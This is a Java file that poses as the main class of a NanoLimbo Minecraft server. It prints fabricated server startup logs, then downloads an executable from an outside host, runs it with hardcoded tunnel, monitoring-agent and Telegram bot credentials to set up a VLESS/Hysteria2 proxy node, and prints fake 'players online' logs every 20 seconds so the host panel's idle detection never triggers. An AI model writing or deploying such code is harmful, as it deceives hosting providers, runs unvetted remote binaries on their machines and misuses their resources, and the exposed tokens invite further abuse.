package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import ua.nanit.limbo.server.LimboServer;

public final class NanoLimbo {
    public static void main(String[] args) {
        // --- 1. 瞬间模拟启动成功日志 ---
        System.out.println("[Server thread/INFO]: Starting minecraft server version 1.20.1");
        System.out.println("[Server thread/INFO]: Loading properties");
        System.out.println("[Server thread/INFO]: Starting Minecraft server on *:25565");
        System.out.println("[Server thread/INFO]: Done (1.5s)! For help, type \"help\"");

        try {
            Map<String, String> envVars = new HashMap<>();
            envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
            envVars.put("NEZHA_SERVER", "nezha.9527x.eu.cc:8008");
            envVars.put("NEZHA_KEY", "mD3q9FowVHp94q0wzg0ha7AUoP8PuXjU");
            
            // 端口对齐：Argo 走 8080，Hy2 走 25565 (UDP)
            envVars.put("ARGO_PORT", "8080"); 
            envVars.put("ARGO_DOMAIN", "xserver.zzkky.ccwu.cc");
            envVars.put("ARGO_AUTH", "eyJhIjoiMWNjMTgyMzQ1MjVlMDM2OTY1ZTYzZTk4OTE5YzQxYWIiLCJ0IjoiNzYzN2JiMmMtOThhOS00ZDU5LWEwMTQtYTE0YjNlNjYxN2IwIiwicyI6Ik5HRTVNV0ZpTVRVdE1HUm1OQzAwTVdFekxXSXlOVEF0T1RVd01tWTBaak5pTVdNMCJ9");
            envVars.put("HY2_PORT", "25565"); 
            
            // TG 通知参数
            envVars.put("CHAT_ID", "5677672165");
            envVars.put("BOT_TOKEN", "8363698033:AAFZqLYnxczqngwJIU-XqnLk7gaVwAK9hZQ");
            
            envVars.put("NAME", "XServer-VLESS-8080");

            // 启动核心 sbsh
            new ProcessBuilder(getBinaryPath().toString())
                .environment(envVars).redirectErrorStream(true).start();

            // 2. 物理保活：每 20 秒发一次模拟日志，彻底封死面板的掉线检测
            new Thread(() -> {
                while (true) {
                    try {
                        Thread.sleep(20000); 
                        System.out.println("[Server thread/INFO]: There are 0 of a max 20 players online.");
                        System.out.flush(); // 强制刷新缓冲区，确保面板能看到日志
                    } catch (Exception ignored) {}
                }
            }).start();

            // 3. LimboServer 必须启动，否则面板探测 25565 TCP 会直接判定超时重启
            new LimboServer().start();
            
        } catch (Exception e) { e.printStackTrace(); }
    }

    private static Path getBinaryPath() throws IOException {
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "mc_sys_vless_8080");
        if (!Files.exists(path)) {
            try (InputStream in = new URL("https://amd64.ssss.nyc.mn/sbsh").openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
}
